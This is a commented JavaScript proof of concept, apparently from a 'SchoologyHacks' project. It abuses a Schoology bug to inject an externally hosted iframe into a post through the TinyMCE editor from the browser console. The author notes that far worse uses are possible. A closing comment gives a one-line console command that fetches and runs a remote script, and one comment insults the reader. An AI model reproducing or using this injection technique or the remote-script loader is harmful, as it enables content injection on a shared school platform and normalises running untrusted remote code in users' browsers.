
// Here's how one could potentially abuse this bug to add a password to a group.
// A rather tame example compared to what one could really do with it.

// Go to https://github.com/BubbyBabur/SchoologyHacks/blob/master/lock/index.html to see the 
// iframe website.

// This line means define a function, then run it.
// If you're confused why this is necessary, it's because it keeps the variables out of the global namespace. 
// If you don't know what that means, GO LEARN JAVASCRIPT you absolute fool of a homo sapien
(function () {

    // First line: we create a variable called "toInsertIframe" and let it be a new element, an iframe.
    // Iframes are elements that can store websites basically. 
    // We're going to use it to lock down your profile with a password.
    // This isn't the safest lock in the world, obviously, anyone with basic JS experience can do some digging and find out.
    let toInsertIframe = document.createElement("iframe");

    // Then, we prompt the user for the password and store it in a variable, password.
    let password = prompt("Please enter the password")
    // We must now encode the URL to make it URL-safe.
    password = encodeURI(password);

    // We add this encoded password as a "hash" to https://bubbybabur.github.io/SchoologyHacks/lock/#.
    // Hashes allow us to tell the website the password.
    // Now we set that as our source for the URL.
    toInsertIframe.src = `https://bubbybabur.github.io/SchoologyHacks/lock/#${password}`;

    // Resize to make the iframe smaller.
    toInsertIframe.width = "10px";
    toInsertIframe.height = "10px";

    // Finally, we get the element "tinymce" that's in Schoology by getting one of its parents first, "edit-body-ifr". 
    // The element tinymce is where the post is stored. Then, we stuff the iframe into "tinymce" and call it a day.
    document.getElementById("edit-body_ifr").contentDocument.getElementById("tinymce").appendChild(toInsertIframe);

    // Finally, we give the user a friendly message to remind them that HTML5 is weird.
    // (alert basically gives the user a message)
    alert("After it shows up (give some time to load), press post. Some sites don't allow you to put them in iframes (most sites actually), but I'm pretty sure Github Pages is a safe bet.");

    // f r i e n d l y   n e i g h b o o r h o o d   r e m i n d e r :
    // IF YOU'RE CONCERNED ABOUT A LINE OF CODE OR DON'T UNDERSTAND HOW IT WORKS, DON'T FREAKING USE IT. 
    // JAVASCRIPT IS DANGERNESS NOISES OK? OK UNDERSTAND? UNDERSTOOD 
    // yeah but seriously don't put weird stuff in your console that you don't understand, your personal user info could be seriously compromised ok?


    // Here's the code for using this again:
    // document.head.appendChild(document.createElement('script')).src = 'https://bubbybabur.github.io/SchoologyHacks/addlock.js'

})();
